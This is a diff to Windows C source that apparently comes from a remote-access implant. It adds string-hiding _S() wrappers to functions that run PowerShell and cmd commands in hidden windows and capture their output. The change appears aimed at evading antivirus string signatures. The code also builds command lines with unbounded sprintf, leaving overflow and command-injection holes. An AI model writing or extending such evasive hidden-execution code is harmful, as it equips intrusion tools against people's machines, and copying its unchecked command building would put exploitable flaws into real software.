@@ -5,7 +5,7 @@
 static char* run_process(const char* command, const char* args) {
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return _strdup("(error: pipe)");
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return _strdup(_S("(error: pipe)"));
 
     STARTUPINFOA si = { sizeof(si) };
     si.dwFlags = STARTF_USESTDHANDLES;
@@ -18,7 +18,7 @@ static char* run_process(const char* command, const char* args) {
 
     if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(hRead); CloseHandle(hWrite);
-        return _strdup("(error: CreateProcess)");
+        return _strdup(_S("(error: CreateProcess)"));
     }
 
     CloseHandle(hWrite);
@@ -41,19 +41,19 @@ static char* run_process(const char* command, const char* args) {
 
     if (total_read == 0) {
         free(result);
-        return _strdup("(no output)\n");
+        return _strdup(_S("(no output)\n"));
     }
     return result;
 }
 
 char* run_powershell(const char* cmd) {
     char args[4096];
-    sprintf(args, "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", cmd);
-    return run_process("powershell", args);
+    sprintf(args, _S("-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\""), cmd);
+    return run_process(_S("powershell"), args);
 }
 
 char* run_cmd(const char* cmd) {
     char args[4096];
-    sprintf(args, "/c %s", cmd);
-    return run_process("cmd", args);
+    sprintf(args, _S("/c %s"), cmd);
+    return run_process(_S("cmd"), args);
 }
